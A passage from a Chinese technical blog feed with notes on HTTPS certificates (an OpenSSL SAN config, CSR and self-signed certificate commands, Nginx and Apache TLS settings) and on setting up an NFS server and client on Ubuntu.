指定那个段落作为证书的基本信息</span><br>req_extensions     = req_ext                      <span class="hljs-comment"># 指定那个段落用来添加扩展字段（SAN）</span><br>prompt             = no                           <span class="hljs-comment"># 不需要交互式输入，内容都从配置文件中读取</span><br><br>[ req_distinguished_name ]<br>C  = CN                                <span class="hljs-comment"># 国家代码，比如 CN</span><br>ST = BeiJing                           <span class="hljs-comment"># 省份</span><br>L  = BeiJing                           <span class="hljs-comment"># 城市</span><br>O  = MyCompany                         <span class="hljs-comment"># 公司名（Let’s Encrypt 可省略，但其他 CA 可能需要）</span><br>CN = es.example.com                    <span class="hljs-comment"># 通常是你网站的域名，主流浏览器只看 SAN，但是 CN 在老客户端可能会检查</span><br><br>[ req_ext ]<br>subjectAltName = @alt_names<br><br>[ alt_names ]<br>DNS.1 = es.example.com                <span class="hljs-comment"># 其实这个写主机名也无所谓，只要我们配置了主机名解析</span><br>DNS.2 = kibana.example.com<br>IP.1 = 192.168.136.8                  <span class="hljs-comment"># 这个字段，大部分权威 CA 是不接受的，它是私有网段，无法公开验证归属权；只有你自己搭建的内部 CA（或某些企业 CA）会接受签发这种证书如果是公网访问服务，就用域名（DNS）字段，CA 会通过域名验证如果只是内网测试，就自签证书或自己搭建 CA；</span><br>一般，如果你确定只有多少台 IP，那么我们一般可以把所有ip 列举出来，然后公用一份 HTTPS 证书，但是在生产环境中，我们也不确定是不是需要扩展，所以一般都是一个服务器生成一份证书<br><br><br><span class="hljs-comment"># 2.2. 精简版</span><br>[ req ]<br>distinguished_name = req_distinguished_name<br>req_extensions     = req_ext<br>prompt             = no<br><br>[ req_distinguished_name ]<br>C  = CN<br>ST = BeiJing<br>L  = BeiJing<br>O  = MyCompany<br>CN = es.example.com<br><br>[ req_ext ]<br>subjectAltName = @alt_names<br><br>[ alt_names ]<br>DNS.1 = es.example.com<br>DNS.2 = kibana.example.com<br>IP.1 = 192.168.136.8<br><br><br><span class="hljs-comment"># 3. 创建 HTTPS 证书签名请求（输入命令后，会让你输入秘钥 aes 加密密码，因为要解密私钥）</span><br>openssl req -new -key <span class="hljs-keyword">private</span>.key -out server.csr -config san.cnf<br></code></pre></td></tr></table></figure><ol><li><code>-key private.key</code>：<ol><li>指定用于生成 CSR 的服务器私钥文件。</li></ol></li><li><code>-out server.csr</code>：<ol><li>指定生成文件的保存的路径和文件名</li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>虽然多个节点可以共用一份 HTTPS 证书，只需在 <code>alt_names</code> 中添加所有节点的 IP（如：<code>ip.1 = 192.168.136.8</code>、<code>ip.2 = 192.168.136.9</code>、<code>ip.3 = 192.168.136.10</code>），这样无论通过 <code>https://192.168.136.8:5601</code> 还是 <code>https://192.168.136.9:5601</code> 访问 Kibana，证书中都能匹配对应 IP，避免中间人将流量引导至其他服务器。然而，这种方式的缺点是：如果集群后续新增节点（如 <code>192.168.136.11</code>），就必须重新生成包含新 IP 的证书。因此，严格来说，这不算真正的“多个节点共用一份证书”。此外，共用证书意味着共用私钥，一旦某个节点被攻破，攻击者便可窃取私钥，从而伪造或解密集群中的通信。因此 <strong>不推荐</strong>这种做法，建议每个节点使用只包含自身 IP 的独立证书。</li><li>相比之下，使用域名方式更为灵活。即使新增多个节点，只需将新节点 IP 添加到域名解析中，原证书依然有效，无需重新生成。因此，在使用域名时，我们推荐多个节点共用一份证书。但仍需注意，一旦证书或私钥被伪造或破解，整个集群都可能受到影响。</li></ol></blockquote><p>&#x3D;&#x3D;5.向 CA 递交 CSR 并申请证书&#x3D;&#x3D;<br>将生成的 <code>server.csr</code> 文件提交给受信任的证书颁发机构（CA），如 DigiCert、Let’s Encrypt 等。</p><p>&#x3D;&#x3D;6.CA 验证你的身份&#x3D;&#x3D;<br>CA 会对域名所有权、组织身份等进行验证，验证通过后进入下一步；</p><p>&#x3D;&#x3D;7.CA 签署 HTTPS 证书&#x3D;&#x3D;<br>当你的身份验证通过后，证书颁发机构（CA）会使用它的 <strong>私钥</strong> 对你的证书签名请求（CSR）进行数字签名。</p><p>这个过程的核心是：CA 使用私钥对 CSR 中的内容计算出一个<strong>数字签名</strong>，并将这个签名附加到最终的证书中，从而确保该证书的<strong>真实性</strong>和<strong>完整性</strong>（防止篡改）。</p><p>签名完成后，CA 会生成一个标准的 <strong>X.509 数字证书</strong>（通常为 <code>.crt</code> 或 <code>.pem</code> 格式），该证书包含以下关键内容：</p><ol><li><font color="#00b0f0">服务器公钥</font><ul><li>即你在 CSR 中提供的公钥，用于后续与客户端建立安全连接。</li></ul></li><li><font color="#00b0f0">数字签名</font><ul><li>CA 用其私钥生成的签名，任何人都可以使用该 CA 的 <strong>公钥</strong> 验证它的有效性，确保证书确实由该 CA 签发，且未被篡改。</li></ul></li><li><font color="#00b0f0">证书元信息</font><ul><li>包括颁发者（CA）的信息、证书有效期、序列号、适用域名、使用范围等信息。</li></ul></li></ol><p>&#x3D;&#x3D;8.用户向你的网站发起 HTTPS 请求&#x3D;&#x3D;<br>用户访问你的网站（如 <code>https://es.example.com</code>）时，浏览器会尝试建立加密连接。</p><p>&#x3D;&#x3D;9.网站服务器返回 HTTPS 证书&#x3D;&#x3D;<br>服务器将刚刚由 CA 签发的 X.509 证书发送给浏览器。</p><p>&#x3D;&#x3D;10.浏览器验证 HTTPS 证书&#x3D;&#x3D;<br>浏览器内置了多个 <strong>受信任的 CA 根证书（Root CA 证书）</strong>，这些证书是由各大权威 CA 自己给自己签发的 X.509 证书，包含了对应 CA 的 <strong>公钥</strong>。<br>浏览器会执行以下操作，用于验证你的 HTTPS 证书：</p><ol><li><font color="#00b0f0">验证证书签名</font>：<ul><li>使用内置的 CA 公钥验证其数字签，检查该证书是否由受信任的 CA 签发</li></ul></li><li><font color="#00b0f0">验证有效期</font>：<ul><li>确认证书当前是否处于有效期内；</li></ul></li><li><font color="#00b0f0">验证域名</font>：<ul><li>它会检查 HTTPS 证书中的 SAN，这个字段里列出了允许用来访问服务器的域名、IP 地址，然后会检查你访问的地址是否在证书的 SAN 列表中出现<ul><li>例如你访问<code>https://es.example.com</code>，他会去 SAN 列表中查找 ex.example.com（注意不是去找域名解析出的 IP 地址，除非你 IP 地址直连，如下面）</li><li>例如你访问<code>https://192.168.136.8</code> ，他会去 SAN 列表中查找 <code>192.168.136.8</code></li></ul></li><li>这个主要是<font color="#ff0000">防止中间人把流量导到另一台危险服务器上</font>，保证，我访问的这台服务器，证书里面也有，那说明这台服务器是安全的，如果你访问的这台服务器，证书里面没有，那你就要小心了</li><li>这个字段就是告诉客户端或浏览器，这个证书对那些域名或ip 有效</li><li>检查证书中绑定的域名是否与你当前访问的网站域名一致。</li></ul></li></ol><p>如果任意一项验证失败，浏览器将提示用户该网站的连接不安全，并发出安全警告，用户可以选择终止访问或继续前往</p><p>&#x3D;&#x3D;11.浏览器生成会话秘钥（对称秘钥）&#x3D;&#x3D;</p><ol><li>浏览器会随机生成一个 <strong>会话密钥</strong>（对称加密所用的密钥），用于后续数据传输中的加密和解密。</li><li>然后，浏览器使用你网站证书中的 <strong>服务器公钥</strong> 对这个会话密钥进行加密，并将加密后的内容发送给服务器。</li><li>由于只有服务器持有对应的 <strong>私钥</strong>，能够解密加密后的内容，即使数据在传输过程中被截获，攻击者也无法解密这个加密后的会话密钥。</li><li>注意：非对称加密（如 RSA）计算复杂、速度较慢，通常只用于密钥交换，而不是用于大数据量的加密通信。</li></ol><p>&#x3D;&#x3D;12.服务器解密会话秘钥&#x3D;&#x3D;</p><ol><li>服务器接收到浏览器发来的加密会话密钥后，使用自己的 <strong>私钥</strong> 进行解密，成功还原出浏览器生成的会话密钥。</li></ol><p>&#x3D;&#x3D;13.后续再通信&#x3D;&#x3D;</p><ol><li>一旦浏览器和服务器都持有相同的会话密钥，后续所有通信内容将通过<strong>该密钥（会话秘钥）</strong> 进行 <strong>对称加密</strong> 和 <strong>解密</strong>。</li><li>这样可以在保证通信安全的同时大幅提升传输效率，即使中间数据被截获，也因加密而无法被解读</li><li>注意：对称加密（如 AES）加解密速度快，适合处理大量传输数据，是实际 HTTPS 通信中的核心加密方式。</li></ol><p>&#x3D;&#x3D;14.补充：如何从私钥推导出公钥&#x3D;&#x3D;<br>在非对称加密中（例如 RSA），私钥（<code>private.key</code>）和公钥（<code>public.key</code>）是一对通过特定数学算法生成的密钥。</p><p>私钥本身包含了推导出对应公钥所需的全部信息，但前提是必须使用与私钥生成时相同的加密算法。此外，只要私钥保持不变，每次推导出的公钥也始终是一致的。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># 1. 使用 RSA 算法生成受 AES-256 加密保护的 2048 位私钥</span><br>openssl genpkey -algorithm RSA -<span class="hljs-keyword">out</span> <span class="hljs-keyword">private</span>.key -pkeyopt rsa_keygen_bits:<span class="hljs-number">2048</span> -aes256<br><br><br><span class="hljs-meta"># 2. 从私钥中导出对应的公钥</span><br>openssl rsa -<span class="hljs-keyword">in</span> <span class="hljs-keyword">private</span>.key -pubout -<span class="hljs-keyword">out</span> <span class="hljs-keyword">public</span>.key<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;15.补充：客户端证书&#x3D;&#x3D;<br>HTTPS 可以要求客户端上传证书，常用于：</p><ol><li>企业内部应用：<ol><li>当只有特定的设备或员工才能访问某些系统时，可以使用客户端证书进行身份验证。</li></ol></li><li>API 调用验证：<ol><li>一些需要保护的 API 接口可能会要求客户端通过证书来证明自己的身份。</li></ol></li><li>金融服务：<ol><li>例如，在线银行或支付系统，客户端证书可以增加安全性，防止非法访问。</li></ol></li></ol><hr><h3 id="3-HTTPS-证书"><a href="#3-HTTPS-证书" class="headerlink" title="3. HTTPS 证书"></a>3. HTTPS 证书</h3><h4 id="3-1-HTTPS-证书-概述"><a href="#3-1-HTTPS-证书-概述" class="headerlink" title="3.1. HTTPS 证书 概述"></a>3.1. HTTPS 证书 概述</h4><p>HTTPS 证书就是 SSL&#x2F;TLS 证书，最初，HTTPS 使用的是 SSL（Secure Sockets Layer，安全套接字层） 进行加密，但 SSL 3.0 已被淘汰，现在主要使用 TLS（Transport Layer Security，传输层安全协议）。</p><table><thead><tr><th>名称</th><th>状态</th><th>说明</th></tr></thead><tbody><tr><td>SSL 1.0</td><td>未发布</td><td></td></tr><tr><td>SSL 2.0</td><td>废弃 ❌</td><td>存在严重漏洞</td></tr><tr><td>SSL 3.0</td><td>废弃 ❌</td><td>容易受 POODLE 攻击</td></tr><tr><td>TLS 1.0</td><td>废弃 ❌</td><td>2020 年起主流浏览器不再支持</td></tr><tr><td>TLS 1.1</td><td>废弃 ❌</td><td>安全性不足</td></tr><tr><td>TLS 1.2</td><td>推荐 ✅</td><td>目前最广泛使用</td></tr><tr><td>TLS 1.3</td><td>最优 🏆</td><td>更快更安全</td></tr></tbody></table><hr><h4 id="3-2-HTTPS-证书-分类"><a href="#3-2-HTTPS-证书-分类" class="headerlink" title="3.2. HTTPS 证书 分类"></a>3.2. HTTPS 证书 分类</h4><ol><li>&#x3D;&#x3D;DV 证书（Domain Validation）&#x3D;&#x3D;：<ol><li>仅验证域名所有权，适合个人博客、小型网站</li><li>例如：Let’s Encrypt（免费）、ZeroSSL</li></ol></li><li>&#x3D;&#x3D;OV 证书（Organization Validation）&#x3D;&#x3D;：<ol><li>需要验证企业身份，适用于企业网站、电商平台</li></ol></li><li>&#x3D;&#x3D;EV 证书（Extended Validation）&#x3D;&#x3D;：<ol><li>最高级别的验证，浏览器地址栏显示企业名称，适合金融、银行、政府网站</li></ol></li></ol><hr><h4 id="3-3-获取-HTTPS-证书"><a href="#3-3-获取-HTTPS-证书" class="headerlink" title="3.3. 获取 HTTPS 证书"></a>3.3. 获取 HTTPS 证书</h4><h5 id="3-3-1-通过证书颁发机构（CA）购买证书"><a href="#3-3-1-通过证书颁发机构（CA）购买证书" class="headerlink" title="3.3.1. 通过证书颁发机构（CA）购买证书"></a>3.3.1. 通过证书颁发机构（CA）购买证书</h5><p>选择一个受信任的证书颁发机构（CA），如 DigiCert、Comodo、GlobalSign、Symantec 等，通常是获取 HTTPS 证书的最常见方式，适用于大多数企业和网站。</p><p>CA 机构颁发 HTTPS 证书的过程是：首先，你需要创建一个证书签名请求（CSR），然后，CA 机构会使用它们的 CA 证书（根证书）签署这个 CSR，从而生成一个有效的 HTTPS 证书并提供给你。</p><hr><h5 id="3-3-2-使用免费证书服务（Let’s-Encrypt）"><a href="#3-3-2-使用免费证书服务（Let’s-Encrypt）" class="headerlink" title="3.3.2. 使用免费证书服务（Let’s Encrypt）"></a>3.3.2. 使用免费证书服务（Let’s Encrypt）</h5><hr><h5 id="3-3-3-通过云服务商获取证书"><a href="#3-3-3-通过云服务商获取证书" class="headerlink" title="3.3.3. 通过云服务商获取证书"></a>3.3.3. 通过云服务商获取证书</h5><p>如果你使用了云服务（如 GoDaddy、Bluehost、阿里云、腾讯云等），这些提供商通常会提供一键获取 HTTPS 证书的服务，方便快捷。</p><hr><h5 id="3-3-4-自签名证书（开发、测试环境）"><a href="#3-3-4-自签名证书（开发、测试环境）" class="headerlink" title="3.3.4. 自签名证书（开发、测试环境）"></a>3.3.4. 自签名证书（开发、测试环境）</h5><p>如果用于测试或开发环境，可以生成一个自签名的 HTTPS 证书，但不推荐在生产环境中使用</p><p>&#x3D;&#x3D;1. 生成自签名证书&#x3D;&#x3D;</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">openssl x509 -req -<span class="hljs-keyword">in</span> <span class="hljs-keyword">server</span>.csr -signkey <span class="hljs-keyword">private</span>.key -out <span class="hljs-keyword">server</span>.crt -days <span class="hljs-number">365</span><br></code></pre></td></tr></table></figure><ol><li><code>-in server.csr</code>：<ol><li>指定用于生成自签名证书文件的证书签名请求文件</li></ol></li><li><code>-signkey private.key</code>：<ol><li>指定用于生成自签名证书文件的秘钥文件（CA 私钥）</li></ol></li><li><code>-out server.crt</code>：<ol><li>指定生成的签名证书文件保存的路径和文件名</li></ol></li><li><code>-days 365</code>：<ol><li>自签名证书的有效期，以天为单位</li></ol></li></ol><p>&#x3D;&#x3D;2.检查自签名证书&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">openssl x509 -<span class="hljs-keyword">in</span> <span class="hljs-keyword">server</span>.crt -<span class="hljs-type">text</span> -noout<br></code></pre></td></tr></table></figure><ol><li><code>-in server.crt</code>：<ol><li>用于检验的自签名证书文件</li></ol></li><li><code>-text</code>：<ol><li>以文本格式显示证书的详细信息。</li><li>包括证书的各种字段，如有效期、发行者、主题、序列号、公钥信息等。</li></ol></li><li><code>-noout</code>：<ol><li>表示只显示证书的详细信息，而不输出证书的内容</li></ol></li></ol><hr><h4 id="3-4-配置-HTTPS-证书"><a href="#3-4-配置-HTTPS-证书" class="headerlink" title="3.4. 配置 HTTPS 证书"></a>3.4. 配置 HTTPS 证书</h4><h5 id="3-4-1-基于-Nginx"><a href="#3-4-1-基于-Nginx" class="headerlink" title="3.4.1. 基于 Nginx"></a>3.4.1. 基于 Nginx</h5><p>假设证书文件位于 <code>/path/to/server.crt</code>，私钥文件位于 <code>/path/to/private.key</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 在 http 块中的 server 块配置 HTTPS 证书</span><br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>    <span class="hljs-attribute">server_name</span> example.com;<br><br>    <span class="hljs-attribute">ssl_certificate</span> /path/to/server.crt;                 <span class="hljs-comment"># 指定证书文件</span><br>    <span class="hljs-attribute">ssl_certificate_key</span> /path/to/private.key;            <span class="hljs-comment"># 指定私钥文件</span><br><br>    <span class="hljs-comment"># 其他配置项</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="3-4-2-基于-Apache"><a href="#3-4-2-基于-Apache" class="headerlink" title="3.4.2. 基于 Apache"></a>3.4.2. 基于 Apache</h5><p>假设证书文件位于 <code>/path/to/server.crt</code>，私钥文件位于 <code>/path/to/private.key</code></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livescript">&lt;VirtualHost *:<span class="hljs-number">443</span>&gt;<br>    ServerAdmin webmaster@localhost<br>    DocumentRoot /<span class="hljs-keyword">var</span>/www/html<br>    ServerName example.com<br><br>    SSLEngine <span class="hljs-literal">on</span><br>    SSLCertificateFile /path/<span class="hljs-keyword">to</span>/server.crt            <span class="hljs-comment"># 指定证书文件</span><br>    SSLCertificateKeyFile /path/<span class="hljs-keyword">to</span>/private.key        <span class="hljs-comment"># 指定私钥文件</span><br><br>    <span class="hljs-comment"># 其他配置项</span><br>&lt;/VirtualHost&gt;<br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>HTTP、HTTPS 协议</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：NFS 基础</title>
    <link href="/2025/03/22/%E7%AC%94%E8%AE%B0%EF%BC%9ANFS%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/03/22/%E7%AC%94%E8%AE%B0%EF%BC%9ANFS%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h3 id="0-导图：Map：NFS"><a href="#0-导图：Map：NFS" class="headerlink" title="0. 导图：Map：NFS"></a>0. 导图：<a href="Map%EF%BC%9ANFS.xmind">Map：NFS</a></h3><hr><h3 id="1-NFS-概述"><a href="#1-NFS-概述" class="headerlink" title="1. NFS 概述"></a>1. NFS 概述</h3><p>NFS（Network File System）是一种允许网络中的计算机共享文件的协议。<font color="#c00000">它允许客户端通过网络访问远程服务器的文件系统，像本地文件一样进行读写操作</font>。</p><hr><h3 id="2-NFS-服务器端配置"><a href="#2-NFS-服务器端配置" class="headerlink" title="2. NFS 服务器端配置"></a>2. NFS 服务器端配置</h3><h4 id="2-1-NFS-服务器概述"><a href="#2-1-NFS-服务器概述" class="headerlink" title="2.1. NFS 服务器概述"></a>2.1. NFS 服务器概述</h4><p>NFS 服务器实际上是一个普通的服务器，区别在于它安装了 NFS 服务并对外提供 NFS 文件共享，因此我们称之为 NFS 服务器。</p><p>通常情况下，NFS 不需要由 Kubernetes 管理或配置，它是一个独立的外部服务，负责数据存储和共享。</p><hr><h4 id="2-2-安装-NFS-服务"><a href="#2-2-安装-NFS-服务" class="headerlink" title="2.2. 安装 NFS 服务"></a>2.2. 安装 NFS 服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 安装 NFS 服务（Ubuntu）</span><br><span class="hljs-built_in">sudo</span> apt-get install nfs-kernel-server   <br><br><br><span class="hljs-comment"># 2. 启动 NFS 服务</span><br>systemctl start nfs-kernel-server<br><br><br><span class="hljs-comment"># 3. 设置 NFS 服务开机自启动</span><br>systemctl <span class="hljs-built_in">enable</span> nfs-kernel-server<br><br><br><span class="hljs-comment"># 4. 检查 NFS 服务状态</span><br><span class="hljs-built_in">sudo</span> systemctl status nfs-kernel-server<br><br><br><span class="hljs-comment"># 5. 开放 NFS 端口（Ubuntu）</span><br><span class="hljs-built_in">sudo</span> ufw allow 2049/tcp<br><span class="hljs-built_in">sudo</span> ufw allow 111/tcp<br><span class="hljs-built_in">sudo</span> ufw allow 111/udp<br><span class="hljs-built_in">sudo</span> ufw allow 20048/tcp<br><span class="hljs-built_in">sudo</span> ufw allow 20048/udp<br><span class="hljs-built_in">sudo</span> ufw allow 875/tcp<br><span class="hljs-built_in">sudo</span> ufw allow 875/udp<br><br><br><span class="hljs-comment"># 6. 重新加载防火墙</span><br><span class="hljs-built_in">sudo</span> ufw <span class="hljs-built_in">enable</span><br><span class="hljs-built_in">sudo</span> ufw reload<br><br><br><span class="hljs-comment"># 补充：关闭防火墙（永久禁用）</span><br><span class="hljs-built_in">sudo</span> ufw <span class="hljs-built_in">disable</span><br></code></pre></td></tr></table></figure><hr><h4 id="2-3-创建普通目录"><a href="#2-3-创建普通目录" class="headerlink" title="2.3. 创建普通目录"></a>2.3. 创建普通目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 创建一个普通目录</span><br><span class="hljs-built_in">mkdir</span> -p /k8s-nfs/redis/data<br><br><br><span class="hljs-comment"># 2. 设置目录权限，使得该目录可以由 NFS 服务以较低权限访问</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> nobody:nogroup /k8s-nfs/redis/data<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chmod</span> 755 /k8s-nfs/redis/data<br></code></pre></td></tr></table></figure><hr><h4 id="2-4-配置共享目录"><a href="#2-4-配置共享目录" class="headerlink" title="2.4. 配置共享目录"></a>2.4. 配置共享目录</h4><p>NFS 使用 <code>/etc/exports</code> 文件来定义共享目录以及访问权限。你需要在这个文件中添加一行，指定哪些客户端可以访问这个共享目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 编辑 /etc/exports</span><br>vim /etc/exports<br><br><br><span class="hljs-comment"># 2. 在 /etc/exports 文件中配置共享目录</span><br>/k8s-nfs/redis/data 192.168.126.0/24(rw,<span class="hljs-built_in">sync</span>,no_subtree_check)<br><br><br><span class="hljs-comment"># 3. 重新导出所有共享目录，使新 NFS 配置生效</span><br><span class="hljs-built_in">sudo</span> exportfs -a<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：<code>/k8s-nfs/redis/data 192.168.126.0/24(rw,sync,no_subtree_check)</code></p><ol><li><code>/k8s-nfs/redis/data</code>：NFS 共享的目录路径</li><li><code>192.168.136.0/24</code>：允许访问该共享目录的客户端 IP 范围（此处是允许整个子网的客户端）</li><li><code>(rw,sync,no_subtree_check)</code>：<ul><li>允许 NFS 客户端进行<strong>读写访问</strong></li><li>确保所有写操作同步完成后再返回结果</li><li>禁用子目录检查，提高性能</li></ul></li></ol></blockquote><hr><h3 id="3-NFS-客户端配置"><a href="#3-NFS-客户端配置" class="headerlink" title="3. NFS 客户端配置"></a>3. NFS 客户端配置</h3><h4 id="3-1-安装-NFS-客户端服务"><a href="#3-1-安装-NFS-客户端服务" class="headerlink" title="3.1. 安装 NFS 客户端服务"></a>3.1. 安装 NFS 客户端服务</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 1. 安装 NFS 客户端服务（安装后通常会自动启动并设置为开机自启动，无需手动设置）</span><br>sudo apt-get <span class="hljs-keyword">install </span>nfs-common                          <span class="hljs-comment"># Ubuntu</span><br><br><br><span class="hljs-comment"># 2. 确保宿主机节点能通过 NFS 访问 NFS 服务器</span><br><span class="hljs-keyword">showmount </span>-e <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">126</span>.<span class="hljs-number">112</span><br></code></pre></td></tr></table></figure><hr><h4 id="3-2-设置临时目录挂载"><a href="#3-2-设置临时目录挂载" class="headerlink" title="3.2. 设置临时目录挂载"></a>3.2. 设置临时目录挂载</h4><p>临时目录挂载：电脑重启后不再进行目录挂载</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 1. 临时挂载</span><br>sudo mount <span class="hljs-number">192.168</span>.<span class="hljs-number">126.100</span><span class="hljs-symbol">:/nfs/redis/data</span> /mnt/nfs-redis<br><br><br><span class="hljs-comment"># 2. 检查挂载是否成功</span><br>df -h<br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;192.168.126.100:&#x2F;nfs&#x2F;redis&#x2F;data&#x3D;&#x3D;：<ol><li>远程 NFS 服务器的共享路径</li></ol></li><li>&#x3D;&#x3D;&#x2F;mnt&#x2F;nfs-redis&#x3D;&#x3D;<ol start="2"><li>本地挂载点，挂载后可以在这里访问远程共享的数据</li></ol></li></ol><hr><h4 id="3-3-设置自动目录挂载（可选）"><a href="#3-3-设置自动目录挂载（可选）" class="headerlink" title="3.3. 设置自动目录挂载（可选）"></a>3.3. 设置自动目录挂载（可选）</h4><p>自动目录挂载：希望在客户端重启后自动挂载 NFS 共享，可以编辑 <code>/etc/fstab</code> 文件，添加如下行：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 1. 自动挂载</span><br><span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span><span class="hljs-symbol">:/nfs/redis/data</span>  /mnt/nfs-redis  nfs  defaults  <span class="hljs-number">0</span>  <span class="hljs-number">0</span><br><br><br><span class="hljs-comment"># 2. 重启主机</span><br><br><br><span class="hljs-comment"># 3. 检查挂载是否成功</span><br>df -h<br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;nfs&#x3D;&#x3D;:<ol><li>文件系统类型，这里是 nfs</li></ol></li><li>&#x3D;&#x3D;defaults&#x3D;&#x3D;：<ol><li>使用默认挂载参数，包括 rw、hard、intr 等</li></ol></li><li>&#x3D;&#x3D;0&#x3D;&#x3D;：<ol><li>表示不需要 dump 备份</li></ol></li><li>&#x3D;&#x3D;0&#x3D;&#x3D;：<ol><li>表示 fsck 在启动时不会检查这个挂载点</li></ol></li></ol><hr><h4 id="3-4-测试目录挂载是否有效"><a href="#3-4-测试目录挂载是否有效" class="headerlink" title="3.4. 测试目录挂载是否有效"></a>3.4. 测试目录挂载是否有效</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">touch</span> /mnt/testfile                            <span class="hljs-comment"># 读权限</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> /mnt/testdir                             <span class="hljs-comment"># 写权限</span><br></code></pre></td></tr></table></figure><hr><h4 id="3-5-补充：卸载目录挂载"><a href="#3-5-补充：卸载目录挂载" class="headerlink" title="3.5. 补充：卸载目录挂载"></a>3.5. 补充：卸载目录挂载</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> umount /mnt/nfs-redis<br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>数据的组织方式</category>
      
      <category>文件存储</category>
      
      <category>NFS</category>
      
      <category>NFS 基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：数据的组织方式类型</title>
    <link href="/2025/03/22/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E7%BB%84%E7%BB%87%E6%96%B9%E5%BC%8F%E7%B1%BB%E5%9E%8B/"/>
    <url>/2025/03/22/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E7%BB%84%E7%BB%87%E6%96%B9%E5%BC%8F%E7%B1%BB%E5%9E%8B/</url>
    
